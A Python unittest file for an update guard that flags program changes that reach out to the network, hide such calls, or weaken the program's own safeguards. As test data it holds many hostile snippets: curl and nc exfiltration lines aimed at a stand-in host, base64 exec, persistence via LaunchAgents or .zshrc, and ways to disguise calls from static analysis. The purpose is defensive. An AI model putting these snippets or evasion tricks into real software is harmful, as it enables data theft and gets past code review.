"""The check before an update is installed (update_guard.py, updates.py): a change that lets the program reach out is found --
plainly written or hidden --, a change that does not is not; an update with findings waits and is installed only with an
approval for exactly its files, from an archive and in a git clone. All with made-up code; nothing is fetched."""
import io
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import update_guard as G   # noqa: E402
import updates             # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def program() -> dict:
    """Kontor's own files as an update would install them."""
    out = {}
    for root, dirs, files in os.walk(ROOT):
        dirs[:] = [d for d in dirs if d not in ("tests", "docs", "node_modules", "__pycache__") and not d.startswith(".")]
        for fn in files:
            rel = os.path.relpath(os.path.join(root, fn), ROOT).replace(os.sep, "/")
            if G.installable(rel):
                with open(os.path.join(root, fn), "rb") as f:
                    out[rel] = f.read()
    return out


def kinds(found) -> set:
    return {f["kind"] for f in found}


# a small program of the same build as Kontor: a part that fetches (checking the address), one that starts a helper, pages
SMALL = {
    "VERSION": b"1.0.0\n",
    "kontor.py": b"import fetch\nimport work\n\n\ndef main():\n    return work.total([1, 2]) + len(fetch.get('https://api.example.org/v'))\n",
    "fetch.py": (b"import urllib.request\n\nALLOWED = ('api.example.org',)\n\n\ndef allowed(url):\n    return url.split('/')[2] in ALLOWED\n\n\n"
                 b"def get(url):\n    if not allowed(url):\n        raise ValueError(url)\n    return urllib.request.urlopen(url, timeout=5).read()\n"),
    "tools.py": (b"import os\nimport subprocess\n\nHELPER = os.path.join(os.path.dirname(__file__), 'helper.swift')\n\n\n"
                 b"def run(binary, *args):\n    return subprocess.run([binary] + list(args), capture_output=True)\n\n\n"
                 b"def build():\n    return run('swiftc', HELPER)\n\n\ndef show(path):\n    subprocess.run(['open', '-R', path])\n"),
    "work.py": b"import json\nimport os\n\n\ndef total(xs):\n    return sum(xs)\n\n\ndef save(path, obj):\n    with open(path, 'w') as f:\n        json.dump(obj, f)\n",
    "updates.py": b"import update_guard\n\n\ndef install():\n    return update_guard\n",
    "update_guard.py": b"HARMLESS = ('json',)\n",
    "helper.swift": b"print(1)\n",
    "web/app.js": b"const api = p => fetch(p);\nfunction go(h) { location.hash = h; }\nfunction link() { return '<a href=\"https://docs.example.org/x\">x</a>'; }\n",
    "web/index.html": b"<html><head><script src=\"/app.js\"></script></head><body></body></html>\n",
    "web/app.css": b".a { color: red; }\n",
    "docs/help.md": b"# Help\n",
}


def changed(base=None, **files) -> dict:
    """The program with some files replaced or added: name__sub for a folder, _py/_js/... for the ending; a function gets the
    old content, bytes are appended, None removes."""
    new = dict(SMALL if base is None else base)
    for key, val in files.items():
        rel = key.replace("__", "/")
        for end in ("py", "js", "html", "css", "swift", "command", "pyc", "md", "jxa", "sh"):
            if rel.endswith("_" + end):
                rel = rel[:-len(end) - 1] + "." + end
        if val is None:
            new.pop(rel, None)
        elif callable(val):
            new[rel] = val(new.get(rel, b""))
        else:
            new[rel] = new.get(rel, b"") + val
    return new


class Found(unittest.TestCase):
    """Ways a change could let the program reach out -- each is named (which kind matters less than that it is)."""

    def found(self, **files):
        return G.compare(SMALL, changed(**files))

    def test_nothing_in_the_same_program(self):
        self.assertEqual(G.compare(SMALL, dict(SMALL)), [])

    def test_plainly_written(self):
        for name, files, kind in (
                ("a request", {"work_py": b"\nimport urllib.request\n\n\ndef send(d):\n    urllib.request.urlopen('https://x.example/u', data=d)\n"}, "module"),
                ("a connection", {"work_py": b"\nimport socket\n\n\ndef send(d):\n    socket.create_connection(('x.example', 443)).send(d)\n"}, "module"),
                ("a program", {"work_py": b"\nimport subprocess\n\n\ndef send(d):\n    subprocess.run(['curl', '-d', d, 'x.example'])\n"}, "module"),
                ("os.system", {"work_py": b"\n\ndef send(d):\n    os.system('nc x 1 < ' + d)\n"}, "call"),
                ("os.popen", {"work_py": b"\n\ndef send(d):\n    return os.popen(d).read()\n"}, "call"),
                ("os.execv", {"work_py": b"\n\ndef send(d):\n    os.execv(d, [d])\n"}, "call"),
                ("ctypes", {"work_py": b"\nimport ctypes\n\n\ndef send():\n    ctypes.CDLL(None).system(b'x')\n"}, "module"),
                ("pickle", {"work_py": b"\nimport pickle\n\n\ndef load(b):\n    return pickle.loads(b)\n"}, "module"),
                ("webbrowser", {"work_py": b"\nimport webbrowser\n\n\ndef send(u):\n    webbrowser.open(u)\n"}, "module"),
                ("a package from elsewhere", {"work_py": b"\nimport requests\n"}, "module"),
                ("a part that is not installed", {"work_py": b"\nimport tests.fixtures\n"}, "module"),
                ("a handler that sends the log", {"work_py": b"\nimport logging.handlers\n\n\ndef on():\n    return logging.handlers.HTTPHandler('x.example', '/u')\n"}, "call"),
                ("everything of a part", {"work_py": b"\nfrom os import *\n"}, "module"),
                ("one risky name of a harmless part", {"work_py": b"\nfrom os import system as quiet\n"}, "module")):
            with self.subTest(name):
                self.assertIn(kind, kinds(self.found(**files)))

    def test_hidden(self):
        for name, files in (
                ("the part looked up as text", {"work_py": b"\n\ndef send():\n    return __import__('so' + 'cket')\n"}),
                ("importlib", {"work_py": b"\nimport importlib\n\n\ndef send():\n    return importlib.import_module('sock' + 'et')\n"}),
                ("a part through another part", {"work_py": b"\nimport shutil\n\n\ndef send(d):\n    shutil.os.system(d)\n"}),
                ("a part through another part, deeper", {"work_py": b"\nimport logging.handlers\n\n\ndef send():\n    return logging.handlers.socket\n"}),
                ("the list of loaded parts", {"work_py": b"\nimport sys\n\n\ndef send():\n    return sys.modules['socket']\n"}),
                ("a name looked up as text", {"work_py": b"\n\ndef send(o, n):\n    return getattr(o, n)\n"}),
                ("a name looked up as text, fixed but telling", {"work_py": b"\n\ndef send(o):\n    return getattr(o, 'system')\n" if False else b"\n\ndef send():\n    return getattr(os, 'sys' + 'tem')\n"}),
                ("getattr handed on", {"work_py": b"\nimport functools\n\n\ndef send(o, names):\n    return functools.reduce(getattr, names, o)\n"}),
                ("code from text", {"work_py": b"\nimport base64\n\n\ndef send(t):\n    exec(base64.b64decode(t))\n"}),
                ("eval", {"work_py": b"\n\ndef send(t):\n    return eval(t)\n"}),
                ("compile", {"work_py": b"\n\ndef send(t):\n    return compile(t, 'x', 'exec')\n"}),
                ("the insides of Python", {"work_py": b"\n\ndef send():\n    return ().__class__.__base__.__subclasses__()\n"}),
                ("a function's own surroundings", {"work_py": b"\n\ndef send():\n    return total.__globals__['os']\n"}),
                ("its surroundings by name", {"work_py": b"\n\ndef send():\n    return globals()['o' + 's']\n"}),
                ("a part handed on as a value", {"work_py": b"\n\ndef send(f):\n    return f(os)\n"}),
                ("a part under another name", {"work_py": b"\nquiet = os\n\n\ndef send(d):\n    quiet.system(d)\n"}),
                ("a part of a part under another name", {"work_py": b"\nquiet = os.system\n\n\ndef send(d):\n    quiet(d)\n"}),
                ("a part's own names as a table", {"work_py": b"\n\ndef send(d):\n    return os.__dict__['sys' + 'tem'](d)\n"}),
                ("operator.attrgetter", {"work_py": b"\nimport operator\n\n\ndef send(d):\n    return operator.attrgetter('sys' + 'tem')(d)\n"}),
                ("a part by its name without importing it", {"work_py": b"\n\ndef send(d):\n    return subprocess.run(d)\n"}),
                ("a package whose other half reaches out", {"work_py": b"\nimport http\n\n\ndef send(d):\n    http.client.HTTPConnection('m.x.example', 80).request('POST', '/c', d)\n"}),
                ("... by name", {"work_py": b"\nfrom http import client as quiet\n\n\ndef send():\n    return quiet.HTTPConnection('m.x.example', 80)\n"}),
                ("... listening", {"work_py": b"\nimport http\n\n\ndef listen():\n    return http.server.HTTPServer(('0.0.0.0', 9999), None)\n"}),
                ("a note of a value's kind turned into code", {"work_py": b"\nimport typing\n\n\nclass X:\n    a: 'print(1)'\n\n\ndef send():\n    return typing.get_type_hints(X)\n"}),
                ("a class built on a part", {"work_py": b"\nimport http.server\n\n\nclass S(http.server.HTTPServer):\n    pass\n"}),
                ("a table of the builtins", {"work_py": b"\n\ndef send(t):\n    return __builtins__['ev' + 'al'](t)\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_what_is_there_already_used_differently(self):
        for name, files in (
                ("another argument for a program", {"tools_py": lambda b: b.replace(b"['open', '-R', path]", b"['open', path]")}),
                ("the helper's place moved", {"tools_py": lambda b: b.replace(b"'helper.swift'", b"'docs', 'help.md'")}),
                ("the allowed addresses widened", {"fetch_py": lambda b: b.replace(b"('api.example.org',)", b"('api.example.org', 'x.example')")}),
                ("the check of the address softened", {"fetch_py": lambda b: b.replace(b"return url.split('/')[2] in ALLOWED", b"return True")}),
                ("the check left out", {"fetch_py": lambda b: b.replace(b"    if not allowed(url):\n        raise ValueError(url)\n", b"")}),
                ("the open starter of programs, used from elsewhere", {"work_py": b"\nimport tools\n\n\ndef send(d):\n    tools.run('/usr/bin/curl', '-d', d, 'x')\n"}),
                ("... imported by name", {"work_py": b"\nfrom tools import run as quiet\n\n\ndef send(d):\n    quiet('/usr/bin/curl', d)\n"}),
                ("... in the same file", {"tools_py": b"\n\ndef send(d):\n    return run('/usr/bin/curl', d)\n"}),
                ("... kept under another name", {"work_py": b"\nimport tools\nquiet = tools.run\n"}),
                ("the allowed addresses replaced from outside", {"work_py": b"\nimport fetch\n\n\ndef send():\n    fetch.ALLOWED += ('x.example',)\n"}),
                ("the check replaced from outside", {"work_py": b"\nimport fetch\n\n\ndef send():\n    fetch.allowed = lambda u: True\n"}),
                ("... with setattr", {"work_py": b"\nimport fetch\n\n\ndef send():\n    setattr(fetch, 'allowed', len)\n"}),
                ("a setting of the file changed from inside a function", {"fetch_py": b"\n\ndef more():\n    global ALLOWED\n    ALLOWED = ALLOWED + ('x.example',)\n"}),
                ("the update check touched from outside", {"work_py": b"\nimport update_guard\n\n\ndef send():\n    update_guard.HARMLESS += ('socket',)\n"}),
                ("the update check changed", {"update_guard_py": b"HARMLESS = HARMLESS + ('socket',)\n"}),
                ("the installer changed", {"updates_py": b"\nX = 1\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_places_and_addresses(self):
        for name, files, kind in (
                ("a start entry of macOS", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/Library/LaunchAgents/x.plist'), 1)\n"}, "place"),
                ("the shell's start file", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/.zshrc'), 1)\n"}, "place"),
                ("a folder that leaves the Mac", {"work_py": b"\nOUT = 'Library/Mobile Documents/x'\n"}, "place"),
                ("a new address in the program", {"work_py": b"\nWHERE = 'https://x.example/in'\n"}, "address"),
                ("a new address on a page", {"web__app_js": b"\nconst more = 'https://x.example/a';\n"}, "address"),
                ("an address without https:", {"web__index_html": b"<img src=\"//x.example/a.png\">\n"}, "address")):
            with self.subTest(name):
                self.assertIn(kind, kinds(self.found(**files)))
        # an address that is there already, written again, is nothing new
        self.assertEqual(self.found(web__app_js=b"\nconst again = 'https://docs.example.org/y';\n"), [])

    def test_pages(self):
        for name, files in (
                ("leaving to another address", {"web__app_js": b"\nfunction send(d) { location.href = u + d; }\n"}),
                ("... assigned to location itself", {"web__app_js": b"\nfunction send(d) { location = u + d; }\n"}),
                ("location.assign", {"web__app_js": b"\nfunction send(d) { location.assign(u + d); }\n"}),
                ("a new window", {"web__app_js": b"\nfunction send(d) { window.open(u + d); }\n"}),
                ("a new window, plain", {"web__app_js": b"\nfunction send(d) { open(u + d); }\n"}),
                ("a new window under another name", {"web__app_js": b"\nconst quiet = window.open;\nfunction send(h, d) { quiet('htt' + 'ps://' + h + '/x?d=' + d); }\n"}),
                ("... plain", {"web__app_js": b"\nconst quiet = open;\nfunction send(h, d) { quiet(h + d); }\n"}),
                ("a link built with Object.assign and clicked", {"web__app_js": b"\nfunction send(h, d) { const a = document.createElement('a'); Object.assign(a, {href: 'htt' + 'ps://' + h + '/x?' + d}); document.body.appendChild(a); a.click(); }\n"}),
                ("a click made by the page", {"web__app_js": b"\nfunction send(a) { a.click(); }\n"}),
                ("a link clicked by the page", {"web__app_js": b"\nfunction send(d) { const a = document.createElement('a'); a.href = u + d; a.click(); }\n"}),
                ("a picture's address set", {"web__app_js": b"\nfunction send(d) { new Image().src = u + d; }\n"}),
                ("setAttribute with an address", {"web__app_js": b"\nfunction send(el, d) { el.setAttribute('href', u + d); }\n"}),
                ("a socket", {"web__app_js": b"\nfunction send() { return new WebSocket(u); }\n"}),
                ("a beacon", {"web__app_js": b"\nfunction send(d) { navigator.sendBeacon(u, d); }\n"}),
                ("a connection between browsers", {"web__app_js": b"\nfunction send() { return new RTCPeerConnection(); }\n"}),
                ("a refresh to another page", {"web__app_js": b"\nfunction send(d) { document.head.innerHTML += '<meta http-equiv=\"refresh\" content=\"0;url=' + d + '\">'; }\n"}),
                ("a name looked up as text", {"web__app_js": b"\nfunction send(d) { window['loc' + 'ation'] = d; }\n"}),
                ("a link element", {"web__app_js": b"\nfunction send() { return document.createElement('link'); }\n"}),
                ("a frame", {"web__app_js": b"\nfunction send(d) { return '<iframe src=\"' + d + '\">'; }\n"}),
                ("code from text", {"web__app_js": b"\nfunction send(t) { return eval(t); }\n"}),
                ("a function from text", {"web__app_js": b"\nfunction send(t) { return new Function(t)(); }\n"}),
                ("a script from elsewhere", {"web__index_html": b"<script src=\"//x.example/a.js\"></script>\n"}),
                ("a style sheet reaching out", {"web__app_css": b".x { background:url(//x.example/a.png); }\n"}),
                ("a style sheet importing", {"web__app_css": b"@import 'https://x.example/a.css';\n"}),
                ("a request to a full address", {"web__app_js": b"\nfetch('https://x.example/a');\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_files_kontor_cannot_read(self):
        for name, files in (
                ("a helper changed", {"helper_swift": b"// more\n"}),
                ("a new script", {"start_command": b"#!/bin/sh\ncurl x\n"}),
                ("a new shell script", {"tools__run_sh": b"curl x\n"}),
                ("translated Python without its text", {"fast_pyc": b"\x00\x01"}),
                ("a program without ending", {"runme": b"\xcf\xfa\xed\xfe"}),
                ("Python no reader understands", {"work_py": b"\ndef (:\n"})):
            with self.subTest(name):
                self.assertTrue({"file", "unreadable"} & kinds(self.found(**files)), name)

    def test_what_is_shown(self):
        f = self.found(work_py=b"\nimport subprocess\n\n\ndef send(d):\n    subprocess.run(['curl', '-d', d, 'x.example'])\n")
        call = [x for x in f if x["kind"] == "call"][0]
        self.assertEqual((call["file"], call["new"]), ("work.py", True)); self.assertIn("subprocess.run(['curl'", call["what"]); self.assertIn("send", call["what"])
        f = self.found(tools_py=lambda b: b.replace(b"['open', '-R', path]", b"['open', path]"))
        self.assertEqual([(x["kind"], x["file"], x["new"]) for x in f], [("call", "tools.py", False)])
        self.assertLessEqual(max(len(x["what"]) for x in f), 160)


class NotFound(unittest.TestCase):
    """What an ordinary update changes is not asked about."""

    def setUp(self):
        # as in Kontor: the function that fetches checks the address itself, the one that shows a file starts one fixed program
        self.keep = G.CHECKED
        G.CHECKED = dict(G.CHECKED, **{"fetch.py": ("get",), "tools.py": ("show",)})

    def tearDown(self):
        G.CHECKED = self.keep

    def test_a_function_that_hands_on_is_followed_until_it_is_listed(self):
        use = {"work_py": b"\nimport fetch\n\n\ndef version():\n    return fetch.get('https://api.example.org/v2')\n"}
        self.assertEqual(G.compare(SMALL, changed(**use)), [])
        G.CHECKED = self.keep
        found = G.compare(SMALL, changed(**use))
        self.assertEqual([(f["kind"], f["file"]) for f in found], [("call", "work.py")]); self.assertIn("fetch.get", found[0]["what"])

    def test_ordinary_changes(self):
        for name, files in (
                ("new arithmetic", {"work_py": b"\n\ndef share(a, b):\n    return round(a * b / 100, 2)\n"}),
                ("a new file that computes", {"plan_py": b"import json\nimport math\nfrom datetime import date\n\n\ndef f(x):\n    return json.dumps([math.sqrt(x), date.today().isoformat()])\n"}),
                ("reading and writing files", {"work_py": b"\n\ndef load(path):\n    with open(path) as f:\n        return json.load(f)\n"}),
                ("comments and explanations", {"tools_py": lambda b: b.replace(b"def run(binary, *args):\n", b"def run(binary, *args):\n    \"\"\"Starts a helper.\"\"\"\n    # as before\n")}),
                ("a harmless part of Python more", {"work_py": b"\nimport re\nimport hashlib\nfrom collections import Counter\n"}),
                ("a new page", {"web__app_js": b"\nfunction vNew() { return `<div class=\"card\">${esc(t('new'))}</div>`; }\nconst mark = () => document.createElement('span');\n"}),
                ("requests of the page to Kontor", {"web__app_js": b"\nconst load = () => fetch('/api/new');\n"}),
                ("styles", {"web__app_css": b".b { background:url(/icon.svg); color:blue; }\n"}),
                ("texts and the version", {"docs__help_md": b"More: https://x.example/doc\n", "VERSION": lambda b: b"1.0.1\n", "CHANGELOG_md": b"## 1.0.1\n"}),
                ("a picture", {"docs__img__a.png": b"\x89PNG"}),
                ("a file taken away", {"web__app_css": None}),
                ("a fixed name looked up", {"work_py": b"\n\ndef name(o):\n    return getattr(o, 'name', '')\n"}),
                ("an object's own values", {"work_py": b"\n\nclass A:\n    def copy(self):\n        return dict(self.__dict__)\n"}),
                ("using what fetches as it is meant", {"work_py": b"\nimport fetch\n\n\ndef version():\n    return fetch.get('https://api.example.org/v2')\n"}),
                ("the fixed program started from elsewhere", {"work_py": b"\nimport tools\n\n\ndef where(p):\n    tools.show(p)\n"})):
            with self.subTest(name):
                self.assertEqual(G.compare(SMALL, changed(**files)), [], name)


class Program(unittest.TestCase):
    """Kontor itself, as it is: readable, its lists true, and changes to its own guarded places found."""

    @classmethod
    def setUpClass(cls):
        cls.files = program()
        cls.scan = G.scan(cls.files)

    def found(self, **files):
        new = changed(self.files, **files)
        return G.differences(self.scan[0], G.scan(new), set(new))

    def test_readable_and_the_same_as_itself(self):
        self.assertEqual([k for k in self.scan[0] if k[0] == "unreadable"], [])
        self.assertEqual(G.differences(self.scan[0], self.scan, set(self.files)), [])
        self.assertEqual(sorted(k[1] for k in self.scan[0] if k[0] == "guard"), ["update_guard.py", "updates.py"])

    def test_the_lists_are_true(self):
        """Every rule and every function named in update_guard is there; no function that hands things on has a name any list
        or text has too (it could not be followed -- give it its own name, or check what it is given and list it as CHECKED)."""
        h = G.handing_on(self.files)
        for table in (G.RULES, G.CHECKED):
            for rel, names in table.items():
                for name in names:
                    self.assertIn(name, h["names"].get(rel, []), "%s: %s is named in update_guard but not there" % (rel, name))
        self.assertEqual(h["common"], [])
        self.assertEqual(sorted(k[2] for k in self.scan[0] if k[0] == "rule" and k[1] == "service.py"), sorted(G.RULES["service.py"]))
        # what hands on today: the open starters of programs and what passes a program's place on to them -- a short list
        self.assertLessEqual(sum(len(v) for v in h["functions"].values()), 30, h["functions"])
        self.assertIn("run", h["functions"]["tls_cert.py"]); self.assertIn("_git", h["functions"]["updates.py"])

    def test_no_big_function_is_a_guarded_place(self):
        """A function that reaches out is kept as a whole: a large one would be shown with every update. Calls that reach out
        live in small functions of their own (service.py: show_in_finder, open_document ...)."""
        big = []
        for rel, data in self.files.items():
            if not rel.endswith(".py") or rel in G.OWN:
                continue
            import ast
            tree = ast.parse(data.decode("utf-8"))
            sizes = {}
            def walk(node, names):
                for c in ast.iter_child_nodes(node):
                    if isinstance(c, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                        sizes[".".join(names + [c.name])] = c.end_lineno - c.lineno + 1
                        walk(c, names + [c.name])
                    else:
                        walk(c, names)
            walk(tree, [])
            for k in self.scan[0]:
                if k[0] in ("call", "detour") and k[1] == rel and sizes.get(k[2], 0) > 70:
                    big.append("%s: %s (%d lines)" % (rel, k[2], sizes[k[2]]))
        self.assertEqual(big, [])

    def test_changes_to_guarded_places(self):
        for name, files in (
                ("the pages' security rules", {"service_py": lambda b: b.replace(b"connect-src 'self'", b"connect-src *")}),
                ("where Kontor may listen", {"service_py": lambda b: b.replace(b'return ip.is_loopback or ip in ipaddress.ip_network("100.64.0.0/10")', b"return True")}),
                ("what the model is shut out of", {"llm_local_py": lambda b: b.replace(b'"(deny network*)"', b'"(allow network*)"')}),
                ("where downloads may come from", {"llm_local_py": lambda b: b.replace(b'host == "huggingface.co"', b'host != "huggingface.co"')}),
                ("the address Kontor always listens on", {"service_py": lambda b: b.replace(b'_Server(("127.0.0.1", port), handler)', b'_Server(("0.0.0.0", port), handler)')}),
                ("the update's addresses", {"updates_py": lambda b: b.replace(b'"objects.githubusercontent.com")', b'"objects.githubusercontent.com", "x.example")')}),
                ("which documents open", {"service_py": lambda b: b.replace(b'DOCUMENTS = frozenset((".pdf",', b'DOCUMENTS = frozenset((".html", ".pdf",')}),
                ("the command sent to the keychain", {"storage_py": lambda b: b.replace(b'["security"] + args', b'["security"] + args + ["-x"]')}),
                ("the script for MoneyMoney", {"mm_bridge_py": lambda b: b.replace(b'JXA_FILE = os.path.join(HERE, "mm_bridge.jxa")', b'JXA_FILE = os.path.join(HERE, "docs", "x.md")')}),
                ("MoneyMoney's allowed commands", {"mm_bridge.jxa": b"\nERLAUBT.createBankTransfer = true;\n"}),
                ("the Touch ID helper", {"touchid.swift": b"\n// more\n"}),
                ("the address opened by `kontor open`", {"kontor_py": lambda b: b.replace(b"def ui_url(", b"def ui_url(c):\n    return 'x://' + str(c)\n\n\ndef ui_url_before(")}),
                ("Tailscale's program started with something else, from another part", {"report_py": b"\nimport tls_cert\n\n\ndef send(d):\n    tls_cert.run('/usr/bin/curl', '-d', d, 'x')\n"}),
                ("git used for something else", {"service_py": b"\n\ndef send(u):\n    updates._git('push', u)\n"}),
                ("the model's program started with something else", {"assistant_py": b"\n\ndef send(ai):\n    ai._spawn('/usr/bin/curl', [], 'x', 1, '')\n"}),
                ("the page's download leaving Kontor's own addresses", {"web__app_js": lambda b: b.replace(b"if (!/^\\/(?!\\/)/.test(String(url))) return; ", b"")}),
                ("the restart leading to another place", {"web__app_js": lambda b: b.replace(b"if (new URL(target).hostname === location.hostname) location.href = target;", b"location.href = target;")}),
                ("the update check replaced while Kontor runs", {"report_py": b"\nimport updates\n\n\ndef send():\n    updates.review = lambda new: {'digest': '', 'findings': []}\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_ordinary_changes_to_kontor(self):
        for name, files in (
                ("texts", {"web__i18n_js": lambda b: b.replace(b'"upd_geaendert":', b'"neu_x":["x", "y"],\n"upd_geaendert":')}),
                ("a page", {"web__app_js": b"\nfunction vNeu() { return `<div class=\"card\">${esc(t('neu'))}</div>`; }\n"}),
                ("arithmetic", {"tax_py": b"\n\ndef share(a, b):\n    return round(a * b / 100, 2)\n", "report_py": b"\nMORE = 'Summe'\n"}),
                ("a request handled", {"service_py": lambda b: b.replace(b'            if path == "/api/update/check":', b'            if path == "/api/new":\n                return self._json(200, {"ok": True})\n            if path == "/api/update/check":')}),
                ("what the assistant may be asked", {"assistant_py": b"\n\ndef more(x):\n    return [x]\n"})):
            with self.subTest(name):
                self.assertEqual(self.found(**files), [], name)


def archive(files: dict, base: str = "Kontor-main") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for rel, data in files.items():
            z.writestr(base + "/" + rel, data)
    return buf.getvalue()


class Install(unittest.TestCase):
    """An update from an archive: without findings installed as ever; with findings it waits -- nothing of it in the program
    folder -- until it is approved for exactly these files."""

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="kontor-guard-")
        self.prog = os.path.join(self.dir, "prog")
        for rel, data in SMALL.items():
            os.makedirs(os.path.dirname(os.path.join(self.prog, rel)), exist_ok=True)
            with open(os.path.join(self.prog, rel), "wb") as f:
                f.write(data)
        self.keep = (updates._get, updates.HERE)
        updates.HERE = self.prog

    def tearDown(self):
        updates._get, updates.HERE = self.keep
        shutil.rmtree(self.dir, ignore_errors=True)

    def install(self, files, **kw):
        updates._get = lambda url, accept="": archive(files)
        return updates.install("x/y", zip_url="https://codeload.github.com/x/y/zip/main", restart=False, **kw)

    def read(self, rel):
        with open(os.path.join(self.prog, rel), "rb") as f:
            return f.read()

    def test_without_findings_as_ever(self):
        new = changed(work_py=b"\n\ndef share(a, b):\n    return a * b\n", VERSION=lambda b: b"1.0.1\n")
        res = self.install(new)
        self.assertTrue(res["ok"], res); self.assertEqual(res["version"], "1.0.1"); self.assertNotIn("review", res)
        self.assertEqual(self.read("work.py"), new["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.1\n")

    def test_with_findings_it_waits(self):
        new = changed(work_py=b"\nimport socket\n\n\ndef send(d):\n    socket.create_connection(('x.example', 443)).send(d)\n", VERSION=lambda b: b"1.0.1\n")
        res = self.install(new)
        self.assertFalse(res["ok"]); self.assertTrue(res["needs_approval"]); self.assertEqual(res["version"], "1.0.1")
        self.assertIn("module", kinds(res["review"]["findings"]))
        self.assertEqual(self.read("work.py"), SMALL["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.0\n")      # nothing of it is there
        # approved for other files (an older look, a guess): still waits
        for wrong in ("x", "0" * 64, G.digest(SMALL)):
            self.assertTrue(self.install(new, approved=wrong).get("needs_approval"), wrong)
        self.assertEqual(self.read("work.py"), SMALL["work.py"])
        # the files changed after you looked: waits again, with what they hold now
        later = changed(new, work_py=b"\nimport subprocess\n")
        again = self.install(later, approved=res["review"]["digest"])
        self.assertTrue(again.get("needs_approval")); self.assertNotEqual(again["review"]["digest"], res["review"]["digest"])
        self.assertEqual(self.read("work.py"), SMALL["work.py"])
        # approved for exactly these files: installed
        done = self.install(new, approved=res["review"]["digest"])
        self.assertTrue(done["ok"], done); self.assertEqual(self.read("work.py"), new["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.1\n")
        # and the version after it, without anything new, needs no approval
        self.assertTrue(self.install(changed(new, VERSION=lambda b: b"1.0.2\n"))["ok"])

    def test_only_what_was_read_is_installed(self):
        """What the archive holds beside the program -- other folders, hidden files, the tests -- never reaches the program
        folder; translated Python and files of unknown kind are findings."""
        new = changed(VERSION=lambda b: b"1.0.1\n")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for rel, data in new.items():
                z.writestr("Kontor-main/" + rel, data)
            z.writestr("Kontor-main/tests/evil.py", b"import socket\n")
            z.writestr("Kontor-main/.hidden.py", b"import socket\n")
            z.writestr("Kontor-main/.github/x.py", b"import socket\n")
            z.writestr("Other/evil.py", b"import socket\n")
            z.writestr("Kontor-main/../outside.py", b"import socket\n")
        updates._get = lambda url, accept="": buf.getvalue()
        res = updates.install("x/y", zip_url="https://codeload.github.com/x", restart=False)
        self.assertTrue(res["ok"], res)
        for gone in ("tests", ".hidden.py", ".github", "evil.py", os.path.join("..", "outside.py")):
            self.assertFalse(os.path.exists(os.path.join(self.prog, gone)), gone)
        res = self.install(changed(new, fast_pyc=b"\x00", VERSION=lambda b: b"1.0.2\n"))
        self.assertTrue(res.get("needs_approval")); self.assertEqual(kinds(res["review"]["findings"]), {"file"})
        self.assertFalse(os.path.exists(os.path.join(self.prog, "fast.pyc")))

    def test_the_daily_look_reads_the_new_version(self):
        new = changed(work_py=b"\nimport socket\n", VERSION=lambda b: b"1.0.1\n")
        updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b"" if url.endswith(".md") else archive(new)
        info = updates.check("x/y")
        self.assertTrue(info["newer"]); self.assertEqual(kinds(info["review"]["findings"]), {"module"})
        self.assertEqual(info["review"]["digest"], G.digest(new))
        clean = changed(VERSION=lambda b: b"1.0.1\n")
        updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b"" if url.endswith(".md") else archive(clean)
        self.assertEqual(updates.check("x/y")["review"]["findings"], [])
        def broken(url, accept=""):
            if url.endswith("/VERSION"):
                return b"1.0.1\n"
            raise OSError("offline")
        updates._get = broken
        info = updates.check("x/y")                              # not readable now: still offered; installing reads it again
        self.assertTrue(info["newer"]); self.assertNotIn("review", info)

    def test_a_check_that_fails_is_a_finding(self):
        keep = G.compare
        G.compare = lambda a, b: 1 / 0
        try:
            res = self.install(changed(VERSION=lambda b: b"1.0.1\n"))
        finally:
            G.compare = keep
        self.assertTrue(res.get("needs_approval")); self.assertEqual(kinds(res["review"]["findings"]), {"unreadable"})
        self.assertEqual(self.read("VERSION"), b"1.0.0\n")


@unittest.skipUnless(shutil.which("git"), "git fehlt")
class InstallInAClone(unittest.TestCase):
    """The program folder as a git clone: fetched, read, and moved forward only to the commit that was read -- no hook, link
    or rule of the repository gets around that."""

    def git(self, where, *args):
        r = subprocess.run(["git", "-C", where, "-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false"] + list(args), capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r.stdout.strip()

    def commit(self, files, message="next"):
        for rel, data in files.items():
            full = os.path.join(self.origin, rel)
            if data is None:
                os.remove(full)
                continue
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "wb") as f:
                f.write(data)
        self.git(self.origin, "add", "-A"); self.git(self.origin, "commit", "-q", "-m", message)
        return self.git(self.origin, "rev-parse", "HEAD")

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="kontor-guard-git-")
        self.origin, self.prog = os.path.join(self.dir, "origin"), os.path.join(self.dir, "prog")
        os.makedirs(self.origin)
        subprocess.run(["git", "-C", self.origin, "init", "-q", "-b", "main"], check=True, capture_output=True)
        self.first = self.commit(dict(SMALL, **{"tests/test_x.py": b"import socket\n"}), "first")
        subprocess.run(["git", "clone", "-q", self.origin, self.prog], check=True, capture_output=True)
        self.keep = updates.HERE
        updates.HERE = self.prog

    def tearDown(self):
        updates.HERE = self.keep
        shutil.rmtree(self.dir, ignore_errors=True)

    def head(self):
        return self.git(self.prog, "rev-parse", "HEAD")

    def test_without_findings_moved_forward(self):
        sha = self.commit({"work.py": SMALL["work.py"] + b"\n\ndef share(a, b):\n    return a * b\n", "VERSION": b"1.0.1\n", "tests/test_x.py": b"import socket\nimport subprocess\n"})
        res = updates.install_via_git(restart=False)
